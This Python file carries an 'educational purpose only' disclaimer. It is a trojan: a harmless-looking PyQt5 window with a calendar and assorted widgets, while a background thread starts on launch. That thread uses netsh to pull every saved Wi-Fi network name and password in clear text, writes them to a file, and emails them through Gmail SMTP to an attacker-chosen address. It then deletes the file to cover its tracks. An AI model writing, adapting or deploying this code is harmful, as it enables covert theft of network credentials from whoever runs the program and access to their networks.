"""
THIS SCRIPT IS FOR EDUCATIONAL PURPOSE ONLY.
DO NOT USE THIS FOR MALICIOUS PURPOSE.
WHATEVER YOU DO WITH THIS SCRIPT I AM NOT RESPONSIBLE FOR ANY KIND OF ILLEGAL ACT DONE BY YOU.
"""

from PyQt5 import QtCore, QtGui, QtWidgets
from threading import Thread
import subprocess # to run the terminal command through this script
import os
import smtplib # to send emails

######################################## WIFI PASS EXTRACTOR ############################################

def extract_wifi():
    main_cmd = str(subprocess.check_output("netsh wlan show profiles")) # get network names
    cmd = main_cmd.split(r'\n')  # each line gets converted to one item of a list

    # the output contains \r.
    cmd = '\n'.join(cmd).replace(r'\r', '').replace("'", '').strip()

    # removing the unwanted things that appear at top
    cmd = cmd[140:].replace('    ', '').strip()

    # it removes all "All User Profile : " thing and we get only wifi names
    cmd = cmd.split('All User Profile : ')

    # above cmd var contains each profile
    for x in cmd:
        if x != '': # if the wifi name is not empty
            wifi_name = x.strip().replace('\n', '').strip() # removing the extra lines and spaces

            # running the command that fetches full wifi profile
            pswd = subprocess.check_output(f"netsh wlan show profile {wifi_name} key=clear").decode()

            ssid_idx = pswd.find("SSID name              : ") # get the the index of this string
            netword_idx = pswd.find("Network type") # it contains "Network type" thing to next line of wifi pass

            # +25 is the length of "SSID name              : " this string
            # wifi password exist between "SSID name              : " and "Network type"
            wifi_ssid = pswd[ssid_idx+25:netword_idx].strip()  # got the wifi ssid

            # get the the index of this string
            key_idx = pswd.find('Key Content            :')

            cost_idx = pswd.find("Cost settings") # contains "Cost settings" next to password

            # +25 is the length of 'Key Content            :' this string
            # wifi password exist between "Key Content            :" and "Cost settings"
            wifi_pswd = pswd[key_idx+25:cost_idx].strip()

            # "s interface on the system." means the wifi is no more
            if wifi_ssid != "s interface on the system.":
                final_output = f"[+] wifi ssid: {wifi_ssid} | pswd: {wifi_pswd} |"

                with open('pswd.txt', 'a') as f:
                    f.write(f"{final_output}\n")

    ################################# EMAIL SENDER #########################################################

    my_gmail = "YOUR EMAIL ADDRESS" # this email address will be used to send wifi passwords
    my_pswd = "YOUR EMAIL PASSWORD" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD

    reciever = "RECIEVER EMAIL ADDRESS" # this email will recieve the extracted wifi password

    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.ehlo()
    smtp_server.starttls()
    smtp_server.ehlo()
    smtp_server.login(my_gmail, my_pswd)

    with open('pswd.txt', 'r') as f:
        id_pass = f.read()

    message = id_pass

    msg = f"To: {reciever}\nFrom: {my_gmail}\nSubject: wifi passwords\n\n{message}"

    smtp_server.sendmail(from_addr=my_gmail, to_addrs=reciever, msg=msg)

    smtp_server.close()
    os.remove('pswd.txt')

lund = Thread(target=extract_wifi) # multi threading
lund.start()

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 600)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(0, 0, 801, 601))
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.calendarWidget = QtWidgets.QCalendarWidget(self.tab)
        self.calendarWidget.setGeometry(QtCore.QRect(0, 0, 791, 571))
        self.calendarWidget.setObjectName("calendarWidget")
        self.tabWidget.addTab(self.tab, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.timeEdit = QtWidgets.QTimeEdit(self.tab_2)
        self.timeEdit.setGeometry(QtCore.QRect(0, 20, 118, 22))
        self.timeEdit.setObjectName("timeEdit")
        self.dateEdit = QtWidgets.QDateEdit(self.tab_2)
        self.dateEdit.setGeometry(QtCore.QRect(130, 20, 110, 22))
        self.dateEdit.setObjectName("dateEdit")
        self.progressBar = QtWidgets.QProgressBar(self.tab_2)
        self.progressBar.setGeometry(QtCore.QRect(250, 20, 118, 23))
        self.progressBar.setProperty("value", 24)
        self.progressBar.setObjectName("progressBar")
        self.lcdNumber = QtWidgets.QLCDNumber(self.tab_2)
        self.lcdNumber.setGeometry(QtCore.QRect(370, 20, 64, 23))
        self.lcdNumber.setObjectName("lcdNumber")
        self.keySequenceEdit = QtWidgets.QKeySequenceEdit(self.tab_2)
        self.keySequenceEdit.setGeometry(QtCore.QRect(10, 60, 113, 20))
        self.keySequenceEdit.setObjectName("keySequenceEdit")
        self.spinBox = QtWidgets.QSpinBox(self.tab_2)
        self.spinBox.setGeometry(QtCore.QRect(140, 80, 42, 22))
        self.spinBox.setObjectName("spinBox")
        self.tabWidget.addTab(self.tab_2, "")
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("MainWindow", "Tab 1"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("MainWindow", "Tab 2"))

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    Alexa = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(Alexa)
    Alexa.show()
    sys.exit(app.exec_())